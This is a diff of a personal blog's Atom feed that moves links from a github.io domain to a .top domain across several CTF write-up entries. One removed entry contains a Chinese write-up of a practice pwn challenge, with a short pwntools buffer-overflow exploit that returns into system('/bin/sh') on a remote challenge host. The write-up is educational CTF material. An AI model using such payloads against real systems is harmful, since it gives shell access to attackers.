     <published>2023-08-28T14:37:09.000Z</published>
     <updated>2024-02-04T06:46:08.370Z</updated>
     
@@ -287,19 +313,19 @@
     
     
     
-    <category term="wp" scheme="http://lmarch2.github.io/categories/wp/"/>
+    <category term="wp" scheme="http://lmarch2.top/categories/wp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="BUUCTF" scheme="http://lmarch2.github.io/tags/BUUCTF/"/>
+    <category term="BUUCTF" scheme="http://lmarch2.top/tags/BUUCTF/"/>
     
   </entry>
   
   <entry>
     <title>PWN一些用到的指令和工具</title>
-    <link href="http://lmarch2.github.io/posts/6121198a/"/>
-    <id>http://lmarch2.github.io/posts/6121198a/</id>
+    <link href="http://lmarch2.top/posts/6121198a/"/>
+    <id>http://lmarch2.top/posts/6121198a/</id>
     <published>2023-08-28T13:54:45.000Z</published>
     <updated>2024-02-04T06:54:35.848Z</updated>
     
@@ -326,19 +352,19 @@
     
     
     
-    <category term="tools and tricks" scheme="http://lmarch2.github.io/categories/tools-and-tricks/"/>
+    <category term="tools and tricks" scheme="http://lmarch2.top/categories/tools-and-tricks/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="pwn" scheme="http://lmarch2.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="http://lmarch2.top/tags/pwn/"/>
     
   </entry>
   
   <entry>
     <title>2023 NepCTF WP</title>
-    <link href="http://lmarch2.github.io/posts/0/"/>
-    <id>http://lmarch2.github.io/posts/0/</id>
+    <link href="http://lmarch2.top/posts/0/"/>
+    <id>http://lmarch2.top/posts/0/</id>
     <published>2023-08-15T03:25:59.095Z</published>
     <updated>2024-02-05T13:35:02.048Z</updated>
     
@@ -352,19 +378,19 @@
     
     
     
-    <category term="wp" scheme="http://lmarch2.github.io/categories/wp/"/>
+    <category term="wp" scheme="http://lmarch2.top/categories/wp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="NepCTF" scheme="http://lmarch2.github.io/tags/NepCTF/"/>
+    <category term="NepCTF" scheme="http://lmarch2.top/tags/NepCTF/"/>
     
   </entry>
   
   <entry>
     <title>week6-T1</title>
-    <link href="http://lmarch2.github.io/posts/c63e16b3/"/>
-    <id>http://lmarch2.github.io/posts/c63e16b3/</id>
+    <link href="http://lmarch2.top/posts/c63e16b3/"/>
+    <id>http://lmarch2.top/posts/c63e16b3/</id>
     <published>2023-04-01T07:43:53.000Z</published>
     <updated>2024-01-31T02:37:37.721Z</updated>
     
@@ -377,19 +403,19 @@
     
     
     
-    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
+    <category term="入门集训wp" scheme="http://lmarch2.top/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="BUUCTF" scheme="http://lmarch2.github.io/tags/BUUCTF/"/>
+    <category term="BUUCTF" scheme="http://lmarch2.top/tags/BUUCTF/"/>
     
   </entry>
   
   <entry>
     <title>week4&amp;&amp;week5-T5</title>
-    <link href="http://lmarch2.github.io/posts/95338453/"/>
-    <id>http://lmarch2.github.io/posts/95338453/</id>
+    <link href="http://lmarch2.top/posts/95338453/"/>
+    <id>http://lmarch2.top/posts/95338453/</id>
     <published>2023-04-01T07:36:00.000Z</published>
     <updated>2024-01-31T02:37:22.424Z</updated>
     
@@ -402,19 +428,19 @@
     
     
     
-    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
+    <category term="入门集训wp" scheme="http://lmarch2.top/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="BUUCTF" scheme="http://lmarch2.github.io/tags/BUUCTF/"/>
+    <category term="BUUCTF" scheme="http://lmarch2.top/tags/BUUCTF/"/>
     
   </entry>
   
   <entry>
     <title>week4&amp;&amp;week5-T4</title>
-    <link href="http://lmarch2.github.io/posts/e234b4c5/"/>
-    <id>http://lmarch2.github.io/posts/e234b4c5/</id>
+    <link href="http://lmarch2.top/posts/e234b4c5/"/>
+    <id>http://lmarch2.top/posts/e234b4c5/</id>
     <published>2023-04-01T07:35:47.000Z</published>
     <updated>2024-01-31T02:37:05.285Z</updated>
     
@@ -427,19 +453,19 @@
     
     
     
-    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
+    <category term="入门集训wp" scheme="http://lmarch2.top/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="ctf-wiki" scheme="http://lmarch2.github.io/tags/ctf-wiki/"/>
+    <category term="ctf-wiki" scheme="http://lmarch2.top/tags/ctf-wiki/"/>
     
   </entry>
   
   <entry>
     <title>week4&amp;&amp;week5-T3</title>
-    <link href="http://lmarch2.github.io/posts/7c502166/"/>
-    <id>http://lmarch2.github.io/posts/7c502166/</id>
+    <link href="http://lmarch2.top/posts/7c502166/"/>
+    <id>http://lmarch2.top/posts/7c502166/</id>
     <published>2023-04-01T07:35:34.000Z</published>
     <updated>2024-01-31T02:36:50.519Z</updated>
     
@@ -452,19 +478,19 @@
     
     
     
-    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
+    <category term="入门集训wp" scheme="http://lmarch2.top/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="BUUCTF" scheme="http://lmarch2.github.io/tags/BUUCTF/"/>
+    <category term="BUUCTF" scheme="http://lmarch2.top/tags/BUUCTF/"/>
     
   </entry>
   
   <entry>
     <title>week4&amp;&amp;week5-T2</title>
-    <link href="http://lmarch2.github.io/posts/b5711f0/"/>
-    <id>http://lmarch2.github.io/posts/b5711f0/</id>
+    <link href="http://lmarch2.top/posts/b5711f0/"/>
+    <id>http://lmarch2.top/posts/b5711f0/</id>
     <published>2023-04-01T07:35:07.000Z</published>
     <updated>2024-01-31T02:36:22.417Z</updated>
     
@@ -478,19 +504,19 @@
     
     
     
-    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
+    <category term="入门集训wp" scheme="http://lmarch2.top/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="ctf-wiki" scheme="http://lmarch2.github.io/tags/ctf-wiki/"/>
+    <category term="ctf-wiki" scheme="http://lmarch2.top/tags/ctf-wiki/"/>
     
   </entry>
   
   <entry>
     <title>week4 T1</title>
-    <link href="http://lmarch2.github.io/posts/64ef4d6b/"/>
-    <id>http://lmarch2.github.io/posts/64ef4d6b/</id>
+    <link href="http://lmarch2.top/posts/64ef4d6b/"/>
+    <id>http://lmarch2.top/posts/64ef4d6b/</id>
     <published>2023-01-20T15:36:57.000Z</published>
     <updated>2024-01-31T02:42:34.735Z</updated>
     
@@ -501,37 +527,12 @@
     
     
     
-    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
+    <category term="入门集训wp" scheme="http://lmarch2.top/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
     
     
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
+    <category term="ctf" scheme="http://lmarch2.top/tags/ctf/"/>
     
-    <category term="BUUCTF" scheme="http://lmarch2.github.io/tags/BUUCTF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>week3 T5</title>
-    <link href="http://lmarch2.github.io/posts/fe55b1cb/"/>
-    <id>http://lmarch2.github.io/posts/fe55b1cb/</id>
-    <published>2023-01-15T14:43:00.000Z</published>
-    <updated>2024-01-31T02:34:54.737Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-level2"><a href="#T5-level2" class="headerlink" title="T5 level2"></a>T5 level2</h2><blockquote><p>2023-01-15WP<br>攻防世界pwn题<br>考点：ret2libc1<br>（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）</p></blockquote><span id="more"></span><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file，checksec —— 32-bit，开启NX</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA一看没啥，点进vuln函数找到一个read函数<br><img src="https://pic1.zhimg.com/80/v2-3f3caf9f6fe1b9fe6e5088a2e1619e2c_1440w.webp"><br><img src="https://pic2.zhimg.com/80/v2-3a54c2fc46d20dc1f7a6493a4fd40ba9_1440w.webp"><br>由图中我们可以看到，buf分配的空间为0x88,而read函数读取0x100，显然存在溢出<br>shift+f12找到有字符串/bin/sh，并且在vuln函数里有system函数，只不过参数是”ehco Input：”罢了<br>记下system函数的plt表地址0x08048320<br><img src="https://pic1.zhimg.com/80/v2-f2adaa287713c287b7d0b7070f687524_1440w.webp"></p><p>这样就只需要我们覆盖buf，将system函数地址写为返回地址，并将/bin/sh作为参数传递其地址即可</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p><pre class=" language-py"><code class="language-py">from pwn import *p = remote(' 61.147.171.105 ', 60218)payload = b'a' * (0x88 + 4) + p32(0x08048320)+b'bbbb' + p32(0x0804A024)#0x88为buf大小，+4是ebp大小，p32(0x08048320)是打包system地址，b'bbbb'是填充无效system返回地址， #p32(0x0804A024)是/bin/sh地址p.sendline(payload)p.interactive()</code></pre>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;T5-level2&quot;&gt;&lt;a href=&quot;#T5-level2&quot; class=&quot;headerlink&quot; title=&quot;T5 level2&quot;&gt;&lt;/a&gt;T5 level2&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;2023-01-15WP&lt;br&gt;攻防世界pwn题&lt;br&gt;考点：ret2libc1&lt;br&gt;（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）&lt;/p&gt;
-&lt;/blockquote&gt;</summary>
-    
-    
-    
-    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
-    
-    
-    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
-    
-    <category term="攻防世界" scheme="http://lmarch2.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
+    <category term="BUUCTF" scheme="http://lmarch2.top/tags/BUUCTF/"/>
     
   </entry>
   
